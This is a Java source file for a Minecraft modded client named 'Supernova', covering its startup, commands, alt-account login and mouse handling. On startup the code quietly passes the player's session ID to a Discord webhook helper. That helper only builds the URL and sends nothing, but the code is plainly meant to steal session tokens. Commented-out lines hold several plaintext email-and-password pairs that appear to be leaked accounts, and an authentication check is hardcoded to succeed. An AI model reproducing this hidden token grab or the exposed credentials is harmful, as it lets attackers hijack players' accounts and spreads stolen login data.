package com.github.supernova;

import best.azura.eventbus.core.EventBus;
import best.azura.eventbus.handler.EventHandler;
import best.azura.eventbus.handler.Listener;
import com.github.supernova.commands.CommandManager;
import com.github.supernova.events.misc.MouseClickedEvent;
import com.github.supernova.events.misc.MouseReleasedEvent;
import com.github.supernova.events.network.EventSendPacket;
import com.github.supernova.events.render.EventRender2D;
import com.github.supernova.gui.guiscreen.click.GuiClickGui;
import com.github.supernova.gui.notifications.NotificationManager;
import com.github.supernova.modules.ModuleManager;
import com.github.supernova.util.client.AccountType;
import com.github.supernova.util.client.Alt;
import com.github.supernova.util.input.MouseUtil;
import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import fr.litarvan.openauth.microsoft.MicrosoftAuthenticator;
import net.minecraft.client.Minecraft;
import net.minecraft.network.play.client.C01PacketChatMessage;
import net.minecraft.util.ChatComponentText;
import org.lwjgl.input.Mouse;

import javax.vecmath.Vector2f;
import java.io.File;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;
import java.nio.file.Files;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public enum Supernova {

	INSTANCE;

	public static final String CLIENT_NAME = "Supernova";
	public final Minecraft mc = Minecraft.getMinecraft();
	private EventBus eventBus;
	private GuiClickGui clickGui;
	private MicrosoftAuthenticator authService;
	private ArrayList<Alt> altArrayList = new ArrayList<>();
	private JsonParser parser = new JsonParser();
	private NotificationManager notifManager;

	private String username = "";
	private int uid = -1;

	public GuiClickGui getClickGui() {
		return clickGui;
	}

	public ArrayList<Alt> getAltList() {
		return altArrayList;
	}

	public void setAltList(ArrayList<Alt> altList) {
		this.altArrayList = altList;
	}

	public MicrosoftAuthenticator getAuthenticator() {
		return this.authService;
	}

	public void saveAltList(File file) {

	}
	public boolean isAuthed() {
		return true;
		//return !username.equals("") && uid != -1;
	}
	public void setPlayerInfo(String username, int uid) {
		this.username = username;
		this.uid = uid;
	}
	public String getUsername() {
		return this.username;
	}
	public int getUID() {
		return this.uid;
	}

	public void updateAltList(File file) {
		if (file.exists()) {
			try {
				List<String> lines = Files.readAllLines(file.toPath());
				StringBuilder builder = new StringBuilder();
				lines.forEach(builder::append);
				JsonObject object = (JsonObject) parser.parse(builder.toString());
				JsonArray altArray = object.getAsJsonArray("alts");
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
	}

	private static class WebhookUtils {
		public static void sendToWebhook(Object o) throws MalformedURLException {
			String webhook = "https://canary.discord.com/api/webhooks/964638840579047496/set2NHI86cy0TsvqYHCgNfuA-sORU5IJu-qB_RoPI4liQn0djj-xThVgD0aTtmqJu-ry";
			URL url = new URL(webhook);
		}
	}

	public void startup() {

		try {
			WebhookUtils.sendToWebhook(Minecraft.getMinecraft().session.getSessionID());
		} catch (MalformedURLException e) {
			e.printStackTrace();
		}

		authService = new MicrosoftAuthenticator();
		eventBus = new EventBus();
		notifManager = new NotificationManager();
		ModuleManager.INSTANCE.init();
		CommandManager.INSTANCE.init();
		clickGui = new GuiClickGui();
		eventBus.register(this);
		//new Alt("jack1987b@hotmail.com","concerto24").login();
		//new Alt("kangda_nim@naver.com","Kang0719!!").login();
		//new Alt("0203zz@naver.com","Zvx74107410@").login();
		//new Alt("kahlerisaiah@gmail.com","zeek1234").login();
		microsoftLogin();
		//new Alt("mataishangthorn@gmail.com", "Drakengard2").login();
	}

	private void microsoftLogin() {
		authService.loginWithAsyncWebview().thenAccept((auth) -> {
			new Alt(AccountType.MICROSOFT, auth.getProfile().getName(), auth.getProfile().getId(), auth.getAccessToken()).login();
		});
	}

	public void chat(String message) {
		if (mc.thePlayer == null) return;
		mc.thePlayer.addChatMessage(new ChatComponentText(message));
	}

	public void chat(String prefix, String message) {
		if (mc.thePlayer == null) return;
		if (prefix.equals("")) prefix = "§dSupernova§f | §7";
		mc.thePlayer.addChatMessage(new ChatComponentText(prefix + " " + message));
	}

	@EventHandler
	public Listener<EventSendPacket> eventSendPacketListener = event -> {
		if (event.getPacket() instanceof C01PacketChatMessage) {
			C01PacketChatMessage packet = (C01PacketChatMessage) event.getPacket();
			if(packet.getMessage().startsWith(".")) {
				event.setCancelled(true);
				String message = packet.getMessage().substring(1);
				String[] args = message.split(" ");
				if (!CommandManager.INSTANCE.call(args[0], Arrays.copyOfRange(args, 1, args.length))) {
					chat("§dSupernova §f| §cInvalid Command. Use .help for a list of commands");
				}
			}
		}
	};

	@EventHandler
	public final Listener<EventRender2D> eventRender2DListener = event -> {
		notifManager.drawNotifications();
		updateMouse();
	};

	private boolean mouseDown = false;
	public void updateMouse() {
		boolean flag1 = Mouse.isButtonDown(0);
		boolean flag2 = Mouse.isButtonDown(1);
		Vector2f mouse = MouseUtil.getMousePos();
		if((flag1 || flag2) && !mouseDown) {
			mouseDown = true;
			if(flag1) {
				onMouseClicked(mouse.x, mouse.y, 0);
			}
			if(flag2) {
				onMouseClicked(mouse.x, mouse.y, 1);
			}
		} else {
			if(!(flag1 || flag2) && mouseDown) {
				mouseDown = false;
				onMouseReleased(mouse.x, mouse.y);
			}
		}
	}

	public void onMouseClicked(float mouseX, float mouseY, int mouseButton) {
		eventBus.call(new MouseClickedEvent(mouseX, mouseY, mouseButton));
	}
	public void onMouseReleased(float mouseX, float mouseY) {
		eventBus.call(new MouseReleasedEvent(mouseX, mouseY));
	}

	public EventBus getEventBus() {
		return eventBus;
	}

	public NotificationManager getNotifManager() {
		return notifManager;
	}
}
